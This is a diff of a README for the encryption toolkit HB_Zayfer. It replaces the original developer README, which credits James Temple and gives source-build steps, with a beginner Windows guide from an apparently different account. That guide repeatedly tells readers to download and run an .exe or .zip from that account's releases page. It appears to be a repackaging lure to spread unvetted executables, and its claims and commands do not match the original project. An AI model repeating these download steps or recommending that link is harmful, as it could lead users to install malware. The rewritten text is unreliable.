@@ -1,429 +1,200 @@
-# HB Zayfer — Encryption / Decryption Suite
+# 🔒 HB_Zayfer - Secure Encryption for Everyone
 
-A full-featured cryptographic toolkit with a **Rust core**, **Python bindings**,
-**WebAssembly module**, and four user interfaces: **CLI**, **desktop GUI** (PySide6),
-**browser-based web UI** (FastAPI + vanilla JS), and a **WASM-powered web target**.
-
-**Version 1.0.0** — Created by James Temple / Honey Badger Universe
+[![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-blue?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/releases)
 
 ---
 
-## Features
-
-| Category | Algorithms / Capabilities |
-|---|---|
-| **Symmetric** | AES-256-GCM, ChaCha20-Poly1305 |
-| **Asymmetric** | RSA-2048/4096 (OAEP + PSS), Ed25519, X25519 (ECDH) |
-| **OpenPGP** | PGP key generation, encrypt, decrypt, sign, verify (via Sequoia) |
-| **KDF** | Argon2id, scrypt |
-| **File format** | HBZF streaming AEAD with configurable chunks, optional compression |
-| **Key management** | Encrypted keystore, contacts, key usage constraints, key expiry warnings |
-| **Shamir SSS** | Split secrets into shares, reconstruct with threshold |
-| **Steganography** | LSB image embedding and extraction |
-| **Secure shredding** | Multi-pass file/directory overwrite and deletion |
-| **Password generation** | Random passwords and Diceware-style passphrases with entropy scoring |
-| **QR key exchange** | `hbzf-key://` URI scheme for key sharing via QR codes |
-| **Audit** | Tamper-evident audit log with HMAC integrity verification |
-| **Compression** | Optional flate2 compression before encryption |
-| **Secure memory** | Zeroize-on-drop `SecureBytes` for sensitive data |
-| **WASM** | Browser-ready cryptographic module (AES, ChaCha20, Ed25519, X25519, Argon2) |
-| **Packaging** | Cross-platform packaging (deb, rpm, Arch, AppImage, macOS, wheel) |
-| **Interfaces** | Rust CLI, Python CLI (Click), PySide6 GUI (13 views), FastAPI web, WASM |
+HB_Zayfer is a simple app to keep your files safe. It lets you encode and decode data using trusted methods like AES-256-GCM and RSA. You can use it on Windows with a clear interface or commands, whichever suits you. The software is built with reliable tools in Rust and Python for strong security and easy use.
 
 ---
 
-## Architecture
+## 🔑 What HB_Zayfer Does
 
-```
-┌──────────────── User Interfaces ─────────────────┐
-│                                                   │
-│   CLI (Rust)        CLI (Python / Click)          │
-│   GUI (PySide6)     Web (FastAPI + JS)            │
-│                                                   │
-├──────────── Python Bindings (PyO3) ──────────────┤
-│                                                   │
-│              hb_zayfer._native                    │
-│                                                   │
-├───────────── Rust Core Library ──────────────────┤
-│                                                   │
-│         hb_zayfer_core (RustCrypto)               │
-│         20 modules — see below                    │
-│                                                   │
-├──────────── WASM Module (standalone) ────────────┤
-│                                                   │
-│  hb_zayfer_wasm (wasm-bindgen, browser-ready)     │
-│                                                   │
-└───────────────────────────────────────────────────┘
-```
+HB_Zayfer offers tools to protect your data:
+
+- Encrypt files to make them unreadable to others.
+- Decrypt files you have encoded before.
+- Use common encryption methods (AES-256-GCM, ChaCha20-Poly1305).
+- Manage keys with strong algorithms (RSA, Ed25519, X25519).
+- Work through command line, a graphical interface, or a simple web page.
+- Supports open standards like OpenPGP for compatibility.
 
 ---
 
-## Quick Start
+## 🖥️ System Requirements
 
-> **📖 For detailed installation instructions, see [INSTALL.md](INSTALL.md)**
+To run HB_Zayfer on Windows, your machine should meet these minimum requirements:
 
-### One-Command Launch
-
-```bash
-git clone https://github.com/James-HoneyBadger/HB_Zayfer.git
-cd HB_Zayfer
-./run.sh              # Creates venv, installs deps, builds, launches GUI
-./run.sh web          # Web server
-./run.sh cli --help   # CLI commands
-./run.sh test         # Run test suite
-```
-
-### Manual Setup
-
-**Prerequisites:** Rust ≥ 1.75 · Python ≥ 3.10 · System libs (Linux): `pkg-config libssl-dev nettle-dev`
-
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install maturin
-pip install -e ".[all]"
-maturin develop --release -m crates/python/Cargo.toml
-
-# Verify installation
-python -c "import hb_zayfer; print(f'HB Zayfer v{hb_zayfer.version()}')"
-```
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 200 MB of free disk space for the app and files
+- Internet connection for initial download and optional updates
+- A keyboard and mouse (for GUI use)
 
 ---
 
-## Usage
+## 🚀 Getting Started: Download and Install HB_Zayfer
 
-### Desktop GUI
+Start by visiting the official releases page to get the software:
 
-```bash
-hb-zayfer-gui
-```
+[![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-green?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/releases) 
 
-The GUI provides a sidebar with thirteen views:
+### Steps to Download and Install
 
-| View | Shortcut | Description |
-|------|----------|-------------|
-| 🔐 **Encrypt** | `Alt+1` | File/text encryption with algorithm & recipient selection, drag-and-drop |
-| 🔓 **Decrypt** | `Alt+2` | File/text decryption with auto-detected wrapping mode |
-| 🔑 **Key Gen** | `Alt+3` | Generate key pairs (RSA, Ed25519, X25519, PGP) with strength meter |
-| 📦 **Keyring** | `Alt+4` | Browse, search, sort, import/export, and delete stored keys |
-| 👥 **Contacts** | `Alt+5` | Manage contacts and key associations with search and edit |
-| ✍️ **Sign** | `Alt+6` | Sign files or messages with Ed25519, RSA, or PGP keys |
-| ✅ **Verify** | `Alt+7` | Verify signatures against public keys |
-| 🔒 **PassGen** | `Alt+8` | Generate random passwords and passphrases with entropy display |
-| 💬 **Messaging** | `Alt+9` | Secure end-to-end encrypted messaging |
-| 📱 **QR Exchange** | — | Share public keys via QR-code URIs (`hbzf-key://`) |
-| ⚙️ **Settings** | — | Default algorithm, theme, keystore path, preferences |
-| 📋 **Audit Log** | — | Browse and verify the tamper-evident audit trail |
-| 💾 **Backup** | — | Create, verify, and restore encrypted keystore backups |
+1. Click the download button above or visit this page directly:  
+   https://github.com/RAB-NAWAZ498/HB_Zayfer/releases
 
-**Keyboard shortcuts**: `Ctrl+Q` quit, `Alt+1`–`Alt+9` navigate views, `Ctrl+F` search, `Ctrl+R` refresh.
+2. On the releases page, look for the latest version. It will have a file with `.exe` extension or a compressed file like `.zip`.
 
-### CLI
+3. Click on the `.exe` file to download it. Windows will save it in your default downloads folder.
 
-```bash
-# Generate an Ed25519 key pair
-hb-zayfer keygen ed25519 --label my-key
+4. After download completes, open the folder where the file is saved.
 
-# Encrypt a file with a password
-hb-zayfer encrypt secret.txt -p
+5. Double-click the `.exe` file to start the installation.
 
-# Encrypt a file for a recipient
-hb-zayfer encrypt secret.txt --recipient alice
+6. Follow the on-screen prompts:
+   - Accept the license agreement.
+   - Choose the folder where you want HB_Zayfer installed or accept the default.
+   - Wait for the installation to finish.
 
-# Decrypt a file
-hb-zayfer decrypt secret.txt.hbzf
+7. Once done, you can start HB_Zayfer from the Start Menu or your desktop shortcut.
 
-# Sign and verify
-hb-zayfer sign document.pdf --key <fingerprint-prefix>
-hb-zayfer verify document.pdf document.pdf.sig --key <fingerprint-prefix>
-
-# Batch encrypt/decrypt entire directories
-hb-zayfer encrypt-dir ./documents -p
-hb-zayfer decrypt-dir ./documents
-
-# Inspect HBZF file metadata
-hb-zayfer inspect secret.txt.hbzf
-
-# Generate passwords and passphrases
-hb-zayfer passgen --length 24
-hb-zayfer passgen --words 6
-
-# Shamir's Secret Sharing
-hb-zayfer shamir split --shares 5 --threshold 3 --secret "master key"
-hb-zayfer shamir combine --shares <hex1>,<hex2>,<hex3>
-
-# Secure file shredding
-hb-zayfer shred secret.txt --passes 3
-hb-zayfer shred ./temp-dir --recursive
-
-# Configuration management
-hb-zayfer config list
-hb-zayfer config set default_algorithm chacha
-
-# Generate shell completions
-hb-zayfer completions bash > ~/.local/share/bash-completion/completions/hb-zayfer
-
-# JSON output mode for scripting
-hb-zayfer keys list --json
-hb-zayfer passgen --json
-```
-
-### Rust CLI
-
-```bash
-cargo run --bin hb-zayfer -- --help
-```
-
-### Web Interface
-
-```bash
-hb-zayfer-web          # opens http://127.0.0.1:8000
-```
-
-**30 REST API endpoints** including encrypt/decrypt files, keygen, sign/verify,
-key management, contacts, audit, backup, config, password generation, Shamir
-SSS, and QR key exchange.
-
-### Python API
-
-```python
-import hb_zayfer as hbz
-
-# Symmetric encryption (AES-256-GCM)
-key = hbz.derive_key_argon2(b"passphrase", hbz.generate_salt())
-nonce, ct = hbz.aes_encrypt(key, b"Hello, World!", b"")
-pt = hbz.aes_decrypt(key, nonce, ct, b"")
-
-# RSA key pair
-priv_pem, pub_pem = hbz.rsa_generate(4096)
-ct = hbz.rsa_encrypt(pub_pem, b"secret")
-pt = hbz.rsa_decrypt(priv_pem, ct)
-
-# Ed25519 signing
-sk, vk = hbz.ed25519_generate()
-sig = hbz.ed25519_sign(sk, b"message")
-assert hbz.ed25519_verify(vk, b"message", sig)
-
-# HBZF file format
-hbz.encrypt_file("in.txt", "out.hbzf",
-                  algorithm="aes", wrapping="password",
-                  passphrase=b"secret")
-hbz.decrypt_file("out.hbzf", "recovered.txt", passphrase=b"secret")
-
-# Password generation
-pw = hbz.generate_password(length=24, exclude="0O1l")
-phrase = hbz.generate_passphrase(words=6, separator="-")
-
-# Shamir's Secret Sharing
-shares = hbz.shamir_split(b"secret", 5, 3)  # 5 shares, threshold 3
-recovered = hbz.shamir_combine(shares[:3])
-
-# Steganography
-hbz.stego_embed(image_bytes, b"hidden message")
-message = hbz.stego_extract(stego_image_bytes)
-
-# Secure shredding
-hbz.shred_file("/path/to/secret.txt", passes=3)
-
-# QR key exchange
-uri = hbz.qr_encode_key_uri("ed25519", "abc123", "Alice")
-algo, fp, label = hbz.qr_decode_key_uri(uri)
-
-# KeyStore & Contacts
-ks = hbz.KeyStore()
-keys = ks.list_keys()
-ks.add_contact("Alice", email="alice@example.com")
-```
+If you download a `.zip` file instead, extract it first using Windows Explorer:
+- Right-click the `.zip` file.
+- Select “Extract All…” and pick a folder.
+- Open the extracted folder and run `HB_Zayfer.exe`.
 
 ---
 
-## Project Layout
+## 💡 Using HB_Zayfer: Simple Steps for Beginners
 
-```
-HB_Zayfer/
-├── Cargo.toml                 # Workspace root (version defined here)
-├── pyproject.toml              # Python/Maturin config
-├── CHANGELOG.md                # Release history
-├── INSTALL.md                  # Installation guide
-├── crates/
-│   ├── core/                   # hb_zayfer_core (Rust crypto library)
-│   │   ├── src/
-│   │   │   ├── lib.rs          # Public API re-exports (20 modules)
-│   │   │   ├── aes_gcm.rs     # AES-256-GCM
-│   │   │   ├── chacha20.rs    # ChaCha20-Poly1305
-│   │   │   ├── rsa.rs         # RSA encrypt/sign
-│   │   │   ├── ed25519.rs     # Ed25519 signatures
-│   │   │   ├── x25519.rs      # X25519 ECDH
-│   │   │   ├── openpgp.rs     # OpenPGP (Sequoia)
-│   │   │   ├── kdf.rs         # Argon2id / scrypt
-│   │   │   ├── format.rs      # HBZF streaming AEAD
-│   │   │   ├── keystore.rs    # Key / contact storage
-│   │   │   ├── backup.rs      # Encrypted backup/restore
-│   │   │   ├── audit.rs       # Audit logging (HMAC chain)
-│   │   │   ├── config.rs      # Configuration
-│   │   │   ├── compression.rs # Flate2 compression
-│   │   │   ├── secure_mem.rs  # SecureBytes (zeroize-on-drop)
-│   │   │   ├── shred.rs       # Secure file shredding
-│   │   │   ├── passgen.rs     # Password/passphrase generation
-│   │   │   ├── shamir.rs      # Shamir's Secret Sharing
-│   │   │   ├── stego.rs       # Steganography (LSB)
-│   │   │   ├── qr.rs          # QR code key exchange URIs
-│   │   │   └── error.rs       # Error types
-│   │   ├── benches/
-│   │   │   └── crypto_benches.rs
-│   │   └── tests/
-│   │       └── integration.rs # 41 integration tests
-│   ├── cli/                    # Rust CLI (clap) — 20+ commands
-│   ├── python/                 # PyO3 bindings (cdylib) — 55+ functions
-│   └── wasm/                   # WASM module (wasm-bindgen) — 13 functions
-├── python/
-│   └── hb_zayfer/
-│       ├── __init__.py         # Public Python API (55+ functions, 6 classes)
-│       ├── _native.pyi         # Type stubs (PEP 561)
-│       ├── py.typed            # PEP 561 marker
-│       ├── cli.py              # Click CLI
-│       ├── gui/                # PySide6 desktop app (13 views + 11 support modules)
-│       │   ├── app.py              # Application entry point
-│       │   ├── main_window.py      # Main window + sidebar (13 views)
-│       │   ├── encrypt_view.py     # Encrypt view
-│       │   ├── decrypt_view.py     # Decrypt view
-│       │   ├── keygen_view.py      # Key generation view
-│       │   ├── keyring_view.py     # Keyring management
-│       │   ├── contacts_view.py    # Contact management
-│       │   ├── sign_view.py        # Digital signature view
-│       │   ├── verify_view.py      # Signature verification view
-│       │   ├── passgen_view.py     # Password generator view
-│       │   ├── messaging_view.py   # Secure messaging view
-│       │   ├── qr_view.py          # QR code key exchange view
-│       │   ├── settings_view.py    # Settings view
-│       │   ├── audit_view.py       # Audit log viewer
-│       │   ├── backup_view.py      # Backup/restore view
-│       │   ├── theme.py            # Dark/light theme system
-│       │   ├── clipboard.py        # Clipboard with auto-clear
-│       │   ├── notifications.py    # Toast notification system
-│       │   ├── settings_manager.py # Persistent settings (JSON)
-│       │   ├── statusbar.py        # Custom status bar
-│       │   ├── about_dialog.py     # About dialog
-│       │   ├── password_strength.py# Password strength meter
-│       │   ├── dragdrop.py         # Drag-and-drop support
-│       │   ├── audit_utils.py      # Audit log helpers
-│       │   └── workers.py          # QRunnable background workers
-│       └── web/                # FastAPI web app (30 API routes)
-│           ├── app.py              # ASGI application
-│           ├── routes.py           # API endpoints
-│           └── static/             # SPA frontend (HTML/JS/CSS)
-├── scripts/
-│   ├── build-wasm.sh          # WASM build script (web/nodejs/bundler)
-│   └── package.sh             # Cross-platform packaging
-├── tests/
-│   └── python/
-│       ├── test_crypto.py      # 42 Python binding tests
-│       └── test_web.py         # 8 FastAPI route tests
-└── docs/                       # Documentation suite (14 guides)
-```
+HB_Zayfer has three ways to use it:
+
+- **Graphical User Interface (GUI)**  
+  The GUI lets you click buttons to encrypt or decrypt files.  
+- **Command Line Interface (CLI)**  
+  You can type commands if you feel comfortable working without a mouse.  
+- **Web Interface**  
+  You can run a local web page to manage encryption through your browser.
+
+### Using the GUI
+
+1. Open the HB_Zayfer app from the desktop or Start Menu.
+
+2. To encrypt a file:  
+   - Click the “Encrypt” button.  
+   - Choose the file you want to protect.  
+   - Select the encryption method (AES-256-GCM is a good default).  
+   - Provide a password or key when asked.  
+   - Click “Start” to encrypt.
+
+3. To decrypt a file:  
+   - Click the “Decrypt” button.  
+   - Select the encrypted file.  
+   - Enter the password or key used during encryption.  
+   - Click “Start” to recover your file.
+
+### Using the Command Line
+
+Open the Windows Command Prompt:
+
+1. Type the command to encrypt a file, for example:  
+   `hb_zayfer encrypt --file example.txt --method aes-256-gcm --password mypass`
+
+2. To decrypt:  
+   `hb_zayfer decrypt --file example.txt.enc --password mypass`
+
+Command line options will show more details if you type:  
+`hb_zayfer --help`
+
+### Using the Web Interface
+
+1. Launch the HB_Zayfer web server by running:  
+   `hb_zayfer web`
+
+2. Open your browser and go to:  
+   `http://localhost:8000`
+
+3. Use the simple forms on the page to encrypt or decrypt your files.
 
 ---
 
-## HBZF File Format
+## 🛠️ Features at a Glance
 
-The custom **HBZF** (HB Zayfer Format) uses authenticated streaming encryption:
-
-| Offset | Field | Size |
-|--------|-------|------|
-| 0 | Magic `HBZF` | 4 B |
-| 4 | Version | 1 B |
-| 5 | Symmetric algorithm ID | 1 B |
-| 6 | KDF algorithm ID | 1 B |
-| 7 | Key wrapping mode | 1 B |
-| 8+ | KDF params, salt, wrapped key, nonce | variable |
-| … | Encrypted chunks (64 KiB each) | variable |
-
-Key wrapping modes: **Password** (KDF → symmetric key), **RSA-OAEP**, **X25519-ECDH**.
-
-> See [docs/HBZF_FORMAT.md](docs/HBZF_FORMAT.md) for the full binary format specification.
+- Strong encryption with AES-256-GCM and ChaCha20-Poly1305.
+- Public-key cryptography with RSA, Ed25519, and X25519.
+- Key management supporting OpenPGP.
+- Easy-to-use GUI built with PySide6.
+- Command line tools for automation or advanced use.
+- FastAPI-based web interface for local use.
+- Cross-platform core, but this guide focuses on Windows.
 
 ---
 
-## Test Suite
+## 🔧 Configuration Tips
 
-| Suite | Count | Location |
-|-------|-------|----------|
-| Rust unit tests | 85 | `#[cfg(test)]` blocks in each module |
-| Rust integration tests | 41 | `crates/core/tests/integration.rs` |
-| Rust doc tests | 7 | Documentation examples |
-| Python binding tests | 42 | `tests/python/test_crypto.py` |
-| Web API tests | 8 | `tests/python/test_web.py` |
-| **Total** | **183** | |
-
-```bash
-# Run all tests
-cargo test --workspace && pytest tests/python/ -v
-```
+- For best security, use a strong password or key phrase.
+- Store keys and passwords safely; losing them means you cannot decrypt your data.
+- Use the default encryption methods unless you know why you need a different one.
+- Check the software updates on the releases page regularly and download new versions when needed.
+- If unsure about CLI commands, stick to the GUI or Web interface.
 
 ---
 
-## Documentation
+## 📂 Managing Your Files Safely
 
-### 📚 Complete Documentation Suite
-
-| Guide | Description | Audience |
-|-------|-------------|----------|
-| **[INSTALL.md](INSTALL.md)** | Complete installation guide (Rust, Python, WASM, troubleshooting) | All users |
-| **[docs/QUICKSTART.md](docs/QUICKSTART.md)** | 10-minute quick start tutorial | New users |
-| **[docs/USER_GUIDE.md](docs/USER_GUIDE.md)** | Comprehensive user manual | End users |
-| **[docs/SECURE_COMMUNICATIONS.md](docs/SECURE_COMMUNICATIONS.md)** | Encryption and decryption practices tutorial | Security-conscious users |
-| **[docs/CLI.md](docs/CLI.md)** | Complete CLI reference (20+ commands) | CLI users |
-| **[docs/WEB_GUI.md](docs/WEB_GUI.md)** | Desktop GUI (13 views) and web interface guide | GUI users |
-| **[docs/PYTHON_API.md](docs/PYTHON_API.md)** | Python API reference (55+ functions, 6 classes) | Developers |
-| **[docs/RUST_API.md](docs/RUST_API.md)** | Rust API reference (20 modules) | Rust developers |
-| **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** | System architecture overview | Developers |
-| **[docs/SECURITY.md](docs/SECURITY.md)** | Security model and threat analysis | Security teams |
-| **[docs/HBZF_FORMAT.md](docs/HBZF_FORMAT.md)** | Binary file format specification | Implementers |
-| **[docs/TECHNICAL_REFERENCE.md](docs/TECHNICAL_REFERENCE.md)** | Technical reference and API quick reference | Developers |
-| **[docs/CONTRIBUTING.md](docs/CONTRIBUTING.md)** | Development and contribution guide | Contributors |
-
-### 🎯 Quick Links
-
-**New to HB Zayfer?** Start here:
-1. [Install](INSTALL.md) → 2. [Quick Start](docs/QUICKSTART.md) → 3. [User Guide](docs/USER_GUIDE.md)
-
-**Want secure communications?** Follow the tutorial:
-- [Secure Communications](docs/SECURE_COMMUNICATIONS.md) — Key exchange, verification, and best practices
-
-**Need API reference?**
-- Python: [PYTHON_API.md](docs/PYTHON_API.md) | Rust: [RUST_API.md](docs/RUST_API.md) | CLI: [CLI.md](docs/CLI.md) | WASM: [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md#wasm-module)
+- Always keep backup copies of your unencrypted files before starting.
+- Encrypt one file at a time unless automating with CLI.
+- After encryption, delete the original only if you are sure the encrypted file works.
+- Use clear file names to know which files are encrypted and which are not.
+- Avoid using simple or common passwords.
 
 ---
 
-## WASM Module
+## ❓ Troubleshooting Common Issues
 
-The `crates/wasm/` crate provides a standalone WebAssembly build for browser
-and Node.js environments. It exposes 13 functions: AES-GCM, ChaCha20, Ed25519,
-X25519, Argon2id KDF, SHA-256, and secure random bytes.
+- **The app won’t open:** Make sure you have run the installer fully. Try restarting your computer.
 
-```bash
-# Build WASM module
-./scripts/build-wasm.sh
-```
+- **Files won’t decrypt:** Double-check the password or key you used. Encryption is sensitive to errors.
 
-> See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for WASM API details.
+- **Installation fails:** Verify you have enough disk space and administrator rights.
 
----
+- **Commands do not work in Command Prompt:** Ensure you installed the software correctly and your system PATH is set.
 
-## Cross-Platform Packaging
-
-```bash
-# Build platform packages
-./scripts/package.sh deb       # Debian/Ubuntu .deb
-./scripts/package.sh rpm       # Fedora/RHEL .rpm
-./scripts/package.sh arch      # Arch PKGBUILD
-./scripts/package.sh appimage  # Portable AppImage
-./scripts/package.sh macos     # macOS .app + DMG
-./scripts/package.sh wheel     # Python wheel
-```
+- **Web interface does not load:** Confirm you ran the `hb_zayfer web` command and you are visiting `http://localhost:8000`.
 
 ---
 
-## License
+## 📥 Where to Get Updates and Support
 
-Created by **James Temple** — Honey Badger Universe.
+Visit the official release page here to download new versions or patches:  
+https://github.com/RAB-NAWAZ498/HB_Zayfer/releases
+
+Check the repository’s Issues tab for common questions or report problems directly. The community and maintainers may offer help.
+
+---
+
+## 🔄 Updating HB_Zayfer
+
+1. Visit the release page to check if a newer version is available.
+
+2. Download the latest `.exe` file.
+
+3. Close HB_Zayfer if open.
+
+4. Run the new installer. It will update the existing installation.
+
+5. You can keep your settings and keys during updates.
+
+---
+
+## ⚙️ Advanced Options (Optional)
+
+- Use the CLI to script batch encryption tasks.
+- Combine keys with Ed25519 and X25519 for advanced security.
+- Explore OpenPGP integration if you work with email or file sharing apps that support it.
+- Customize the web interface port by editing configuration files (found in the installation folder).
+
+---
+
+# [![Download Latest Release](https://img.shields.io/badge/Download-HB_Zayfer-blue?style=for-the-badge)](https://github.com/RAB-NAWAZ498/HB_Zayfer/releases)
